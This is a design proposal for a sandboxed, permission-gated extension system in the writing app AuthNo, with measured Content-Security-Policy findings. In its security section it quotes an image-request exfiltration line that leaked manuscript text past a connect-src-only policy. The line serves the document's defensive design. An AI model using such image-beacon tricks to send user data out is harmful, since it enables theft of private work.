# Extension system v2 — design

Status: **proposal, for decision.** Nothing here is built yet.

This document decides how AuthNo extensions work in 1.1.20. It exists because
v2 is not an addition to v1 — it changes the trust model, and the trust model
has to be settled before any of the features on top of it are worth building.

Where a claim is marked **measured**, it was run in Chromium in this repo and
the result is quoted. Everything else is argument, and is labelled as such.

---

## 1. What v1 actually is today

Worth being precise, because the gap is larger than it looks.

**Extensions are already isolated from the app.** Since 1.1.19-beta.5 both
extension frames carry `sandbox="allow-scripts"` and nothing else. The frame
gets an opaque origin: `parent.anything` throws, there is no localStorage of
its own, and `postMessage` is the only way out. That part is done and checked
in a real browser by `npm run check:sandbox`.

**Extensions are not isolated from your books.** Every extension gets all
sixteen capabilities the host answers:

```
storage.get  storage.set  storage.keys  toast  navigate
openBrowser  closeBrowser  oauth  googleSignIn  requestDriveToken
getSessions  importSession  replaceSession  encodeSession
exportSessionAs  registerHook
```

`getSessions` returns the library. `encodeSession` turns a book into bytes.
`openBrowser` opens any https URL. Nothing in the manifest declares which of
these an extension wants, nothing at install time asks, and nothing at runtime
refuses. An extension that says it tidies chapter headings can read every
manuscript you own and post it somewhere, and the only sign is that it asked to
be installed.

**Contributions can only open a page, and only one page.** The manifest schema
already supports several — Cloud Backup declares `settings`, `conflict` and
`cloud-files` — but every contribution it can make points at `settings`, and
two of its three pages are unreachable. There is no way to say "this button
runs a command" rather than "this button opens a page".

**The manifest validates four fields.** `id`, `name`, `version`, and that the
id has no path separators in it. That is the whole schema.

So v2 is not "add permissions to v1". It is the first version where the
manifest means anything.

---

## 2. The runtime: what language extensions are written in

**Decision: JavaScript and WebAssembly, in the sandboxed frame. Not a new
language, not a plugin host, not native code.**

The constraint that settles this is one you named: extensions must run inside
AuthNo on both Android and desktop, not as separate processes. AuthNo is a
React app in a WebView on Android and in Electron on desktop. The only
execution engine guaranteed to exist in both, with the same semantics, is the
JavaScript engine already running the app.

The alternatives, and why each loses:

| option | why not |
|---|---|
| Native plugins (`.so`/`.dll`) | Two toolchains, two ABIs, and code with the app's full OS privileges. The sandbox stops being a boundary. |
| A scripting language (Lua, Python) | Means shipping an interpreter — megabytes to the APK, a second debugger story, a second FFI to audit, and no browser sandbox around it. |
| A custom DSL | Solves capability control by being weak, then spends years growing back into a language. Nobody wants to learn it. |
| **JS + WASM in the frame** | The engine is already there, on both platforms. The browser enforces the boundary rather than us. WASM covers the "I want to write it in Rust/Go/C++" case with no work on our side. |

WASM matters more than it sounds: an author who wants Rust compiles to
`.wasm`, and it loads inside the same frame with the same permissions, because
`WebAssembly.instantiate` is just another API the frame has. We do not have to
build or support anything for that to be true.

**What v2 adds is not a new language. It is a real API surface and a real
boundary around it.**

### TypeScript

First-class in the *tooling*, not the runtime. `extbk build` type-checks
against a published `@authno/extension-types` package and emits plain JS. The
runtime never sees types. This is how VS Code does it and it is the cheapest
possible win: authors get completion for all sixteen capabilities and every
permission name.

---

## 3. Security: the two things you asked about

### 3.1 "Extensions must not be able to reverse-engineer the app"

Largely already true, and worth stating exactly how far it goes.

The frame has an opaque origin, so `parent.*` throws — not returns undefined,
*throws*, cross-origin. Extension code cannot read the app's modules, its
variables, its DOM, or its localStorage. It sees the sixteen message types the
host answers and nothing else. **Measured** in `check:sandbox` and again under
load in `stress:extensions`.

What is *not* protected, and cannot be: the app's own JavaScript bundle is
shipped to the device. Anyone who installs AuthNo can read `main.<hash>.js`
with a text editor. That is true of every web-technology app and no amount of
minification changes it — minification is a speed bump measured in hours. **We
should not claim otherwise anywhere in the docs or the store listing.**

The honest framing: an extension cannot reach *into a running AuthNo*. Nobody
can stop a determined person reading the shipped bundle offline. Those are
different threats and only the first one matters for extension safety.

The reverse — protecting an *extension author's* code from users — is also not
achievable and should not be promised. `.extbk` can obfuscate; it cannot
encrypt, because the device has to run the code and therefore has to hold the
key. If a marketplace ever sells extensions, the thing that makes them worth
buying has to be a service or an update stream, not secret source.

### 3.2 "Extensions must not be able to steal manuscripts"

This is the one that needs new machinery, and it needs it in two places.

**The API side** is the permission model in §4: `getSessions` simply is not
answered unless the manifest declared `library:read` and the writer granted it.

**The network side is the harder half, and it is where a naive design fails.**
An extension's `fetch` runs in its own realm. The host cannot hook it — you
cannot patch a function in another window you have no reference into. If the
extension can reach the network at all, then any capability that hands it text
is an exfiltration path, and the permission model above is decoration.

The only thing that can bind a frame's network access is the browser. A
`Content-Security-Policy` in the frame document does exactly that, and the
policy is generated by the host from the manifest, so the extension never
chooses it.

Four things had to be true. All four were **measured** in Chromium:

| question | result |
|---|---|
| Is a `<meta http-equiv="Content-Security-Policy">` in a `srcdoc` document enforced? | **Yes.** `connect-src 'none'` blocked a fetch that otherwise succeeded. |
| Can the extension remove the meta tag afterwards? | **No.** Removed it, then fetched: still blocked. The policy is bound at parse time. |
| Can it inject a wider policy? | **No.** Injecting `connect-src *` changed nothing — policies compose as intersection, never union. |
| Can it escape through XHR, or a nested iframe of its own? | **No.** Both blocked; a child frame inherits. |

And then the result that shaped the whole design:

> With `connect-src 'none'`, an `<img src="http://…/leak?manuscript=CHAPTER-ONE">`
> **reached the server.** With `default-src 'none'`, the server saw no request
> at all.

`connect-src` does not cover images. A manuscript leaves perfectly well one
query string at a time through `new Image().src`, and a policy that names
`connect-src` would have looked airtight while leaking.

**So the rule is: the generated policy is built from `default-src 'none'` and
grants are added explicitly.** Never the other way round. Every fetch
directive — `img-src`, `media-src`, `font-src`, `form-action`, `frame-src`,
`worker-src`, `connect-src` — has to be denied by default, because each is a
channel and only one of them is called "connect".

A network permission is therefore not a boolean. It is a host list, compiled
into the policy:

```
default-src 'none';
script-src 'unsafe-inline' blob:;      /* the extension's own modules */
style-src  'unsafe-inline';
img-src    'self' data: blob: https://api.dropbox.com;
connect-src https://api.dropbox.com https://content.dropboxapi.com;
form-action 'none';
```

An extension granted no network permission gets `default-src 'none'` with only
the script and style grants it needs to render, and there is then **no channel
out of the frame at all** except `postMessage` to the host — which the host
audits.

### 3.3 The residual risk, stated plainly

A permission model moves the decision to the writer. It does not remove it. An
extension that legitimately needs `library:read` *and* a network host — a cloud
backup extension needs precisely that — can send manuscripts to its own server,
because that is the feature. What v2 buys is that the writer was asked, in
words, and can see afterwards which extension holds which grant. That is the
achievable goal; "safe by construction" is not, and we should not write it.

Two things narrow it further and are worth building:

- **Grant the narrow scope by default.** `library:read` should be
  `library:read:current` (the open book) unless the extension asks for
  `library:read:all` and says why.
- **Show the traffic.** A per-extension panel listing the hosts it has actually
  contacted, with counts. Cheap, because the CSP already enumerates the only
  hosts it *can* contact, and it turns an abstract grant into something a
  writer can check.

---

## 4. The permission model

### 4.1 Declared in the manifest

```jsonc
{
  "id": "cloud-backup",
  "apiVersion": 2,
  "permissions": {
    "library:read:all":  { "reason": "To upload every book, not just the open one." },
    "library:write":     { "reason": "To restore a book you pick from the cloud." },
    "network": {
      "hosts": ["https://api.dropbox.com", "https://content.dropboxapi.com"],
      "reason": "To talk to Dropbox."
    },
    "notifications":     { "reason": "To tell you when a sync fails." },
    "widgets":           { "reason": "To show sync status on your home screen." }
  }
}
```

`reason` is **required** and is shown verbatim to the writer. An extension that
cannot explain why it wants your library in one sentence has told you
something.

### 4.2 The permission set

Deliberately small. Each one is a sentence a writer can answer, not a
capability name.

| permission | what it unlocks | prompt reads |
|---|---|---|
| `library:read:current` | the open book | "Read the book you have open" |
| `library:read:all` | `getSessions` | "Read all your books" |
| `library:write` | `importSession`, `replaceSession` | "Add and change books" |
| `library:export` | `exportSessionAs`, `encodeSession` | "Turn your books into files" |
| `network` | `fetch`/`img` to the named hosts | "Connect to the internet (dropbox.com)" |
| `notifications` | post a system notification | "Send you notifications" |
| `widgets` | contribute a home-screen widget | "Add widgets to your home screen" |
| `browser` | `openBrowser`, `oauth` | "Open pages in your browser" |
| `storage` | its own key-value space | *(not prompted — always granted, already namespaced and private)* |

Three notes on the shape:

- **`network` names hosts, never `true`.** The prompt says which. "Connect to
  the internet" with no name is a question nobody can answer well.
- **`storage` is not a prompt.** It is already per-extension and invisible to
  others; asking about it trains people to tap through prompts.
- **Everything not listed is refused,** which is the property `dispatch`
  already has and simply needs wiring to a grant table.

### 4.3 Enforced in one place

`dispatch` is already the single switch every capability goes through. It gains
one line per case:

```js
case 'getSessions':
  requirePermission(ctx, 'library:read:all');
  return handlers.getSessions?.() ?? [];
```

`requirePermission` throws a refusal the extension can catch and explain. The
check must live *in* `dispatch` and nowhere else — the lesson from the sandbox
bug is that a boundary enforced in two places is enforced in one.

A check will assert that every `case` in `dispatch` either names a permission
or is on a short explicit free-list. That is the mechanism that stops capability
seventeen shipping ungated.

---

## 5. Multiple pages, and contributions that are not pages

The manifest already has a `pages` map. What is missing is that a contribution
can only *open* one.

```jsonc
"contributes": {
  "settings":  [{ "id": "cb-settings", "label": "Cloud Backup", "page": "settings" }],
  "bookActions": [
    { "id": "backup-now", "label": "Back up now", "command": "sync.now" },
    { "id": "history",    "label": "Cloud history", "page": "cloud-files" }
  ],
  "editorToolbar": [{ "id": "wordcount", "label": "Live stats", "panel": "stats" }]
}
```

Three kinds of target, and the distinction is the fix:

- **`page`** — opens a full page from the `pages` map. Several buttons, several
  pages. This is what is broken today.
- **`command`** — calls a function the extension registered with
  `host.registerCommand('sync.now', fn)`. No UI at all. "Back up now" should
  back up, not open a settings screen.
- **`panel`** — a small surface docked beside the editor rather than a page.

Plus **`when`** clauses, so a contribution appears only where it makes sense:

```jsonc
{ "id": "backup-now", "label": "Back up now", "command": "sync.now",
  "when": "book.isSaved && ext.hasPermission('network')" }
```

A tiny expression language — property lookups, `&&`, `||`, `!`, comparison —
evaluated on the host against a fixed context object. Not `eval`, and not
Turing-complete: it decides visibility, and a visibility rule that can loop is
a bug generator.

---

## 6. The native settings page

**Decision: the app renders it from a declarative schema. The extension does
not build it.**

This is the single biggest quality win available, and it costs authors less
work, not more:

```jsonc
"settings": {
  "schema": [
    { "key": "provider", "type": "select", "label": "Cloud provider",
      "options": ["Google Drive", "Dropbox", "WebDAV"], "default": "Google Drive" },
    { "key": "interval", "type": "number", "label": "Sync every", "suffix": "minutes",
      "min": 5, "max": 1440, "default": 30 },
    { "key": "wifiOnly", "type": "toggle", "label": "Only on Wi-Fi", "default": true },
    { "key": "account",  "type": "action", "label": "Connect account", "command": "auth.connect" }
  ]
}
```

Why this beats a custom page for most extensions:

- It looks like AuthNo, because it *is* AuthNo — same controls, same theme,
  same dark mode, same accessibility, same behaviour under Material You.
- Values land in the extension's storage automatically. No bridge code.
- It renders identically on a phone and a laptop with no responsive work.
- **It needs no frame**, so a settings-only extension can be granted nothing at
  all and still be configurable.

The app-native settings page also hosts the parts the extension does *not*
own: version, author, install date, the permission list with per-permission
toggles, the hosts-contacted panel from §3.3, and Uninstall.

A custom `ui-file` page stays available for genuinely custom UI — the conflict
resolver is a real example — but it should be the exception, and the docs
should say so.

---

## 7. Install → onboarding → permissions

Order matters, and the order you proposed is the right one. Teach first, then
ask.

```
  ┌────────────┐    ┌─────────────┐    ┌──────────────┐    ┌─────────┐
  │  Install   │ →  │  Onboarding │ →  │  Permissions │ →  │  Ready  │
  │  (verify)  │    │  (optional) │    │   (asked)    │    │         │
  └────────────┘    └─────────────┘    └──────────────┘    └─────────┘
                          skip ↓              ↓ deny all
                    ┌───────────────────────────────────┐
                    │  Installed, inert, still uninstall │
                    └───────────────────────────────────┘
```

**Onboarding** is declarative, for the same reasons as the settings page — and
because an onboarding flow that can run arbitrary code before any permission
has been granted is exactly the wrong place for arbitrary code:

```jsonc
"onboarding": {
  "steps": [
    { "title": "Your books, backed up",
      "body": "Cloud Backup copies your .authbook files to a cloud account you own.",
      "image": "onboarding/1.png" },
    { "title": "You choose the provider",
      "body": "Google Drive, Dropbox or any WebDAV server.",
      "image": "onboarding/2.png" }
  ]
}
```

Omit the key and there is no onboarding. Two to five steps; the app should
refuse to render more, because an onboarding somebody cannot finish is a
tutorial nobody reads.

**Permission prompts** come after, one screen, all requests listed with their
reasons, and each individually refusable:

```
  Cloud Backup would like to:

  ☑  Read all your books
      "To upload every book, not just the open one."

  ☑  Connect to the internet — api.dropbox.com, content.dropboxapi.com
      "To talk to Dropbox."

  ☐  Send you notifications
      "To tell you when a sync fails."

           [ Not now ]              [ Allow selected ]
```

Four rules that matter more than the visual:

1. **Deny is always available and never fatal.** A denied extension installs
   and runs inert. It must not crash, and its own UI should say what it cannot
   do.
2. **Every grant is revocable later**, from the native settings page, with the
   same wording.
3. **New permissions in an update re-prompt**, and only for the new ones. An
   update must never silently widen a grant.
4. **The runtime re-reads grants**, so revoking takes effect without a restart.

---

## 8. Additions worth building that you did not name

Ordered by value per unit of work.

1. **A capability audit check in CI.** Every `case` in `dispatch` must name a
   permission or be on an explicit free-list. This is the check that keeps the
   model true in a year, and it is about thirty lines.
2. **`apiVersion` in the manifest, refused if unknown.** v1 extensions must not
   silently load into a v2 runtime and get every capability by default. This is
   the migration hazard and it wants deciding on day one, not later.
3. **Hosts-contacted panel** (§3.3). Turns a grant into something checkable.
4. **A dev-mode hot reload.** `extbk watch` already rebuilds; the app can watch
   the extensions directory and restart a changed extension. The current loop is
   build → install → restart, and it is the main reason writing an extension is
   unpleasant.
5. **Structured errors to the author.** An extension that throws in `activate()`
   currently produces a toast. It should produce a per-extension log the author
   can read from the native settings page.
6. **A `dry-run` permission mode for the sandbox harness**, so an author can see
   exactly which permission each of their calls requires before shipping.
7. **Signed extensions, eventually.** Not for 1.1.20. Worth designing the
   manifest so a `signature` block can be added without a format break — the
   `.extbk` container already has room.

---

## 9. Migration, and what it costs

Cloud Backup 1.5.0 is the only real extension and the migration is small,
which is the argument for doing this now rather than at ten extensions.

| v1 | v2 |
|---|---|
| no `apiVersion` | `"apiVersion": 2` |
| no permissions | `library:read:all`, `library:write`, `network`, `notifications` |
| `Settings.js` — a hand-built UI page | a `settings.schema` block; the file shrinks or goes |
| `backup-now` → `page: "settings"` | `command: "sync.now"` |
| `conflict`, `cloud-files` unreachable | reachable, via their own contributions |
| `"tier": "premium"` | unchanged |

**The breaking change to be explicit about:** a v1 extension loaded by a v2
runtime must be refused, not adapted. Adapting it means guessing its
permissions, and the only safe guess is "all of them" — which is the thing
being fixed. `apiVersion` absent ⇒ v1 ⇒ refuse with a message naming what to
add.

---

## 10. What is decided and what is not

**Decided by measurement, not preference:**

- JS + WASM in the sandboxed frame. Nothing else runs on both platforms in one
  engine.
- Network permission enforced by a host-generated CSP built from
  `default-src 'none'`. Verified enforceable, verified tamper-proof, and
  verified that the obvious weaker version (`connect-src`) leaks through an
  image.

**Open, and wanting your call:**

1. **Is `network` grantable at all to a non-store extension?** A sideloaded
   `.extbk` with `library:read:all` + `network` is, by construction, able to
   upload your manuscripts. The prompt says so. Is a prompt enough, or should
   that combination require something stronger?
2. **Does `library:read:all` need a per-book scope?** "This extension can read
   *these three* books" is friendlier and materially more work.
3. **How strict is the onboarding cap?** I suggest a hard refusal above five
   steps.
4. **Do we ship `panel` in 1.1.20**, or land `page` + `command` + `when` first
   and add panels in 1.1.21? Panels touch the editor layout, which is the most
   delicate surface in the app.
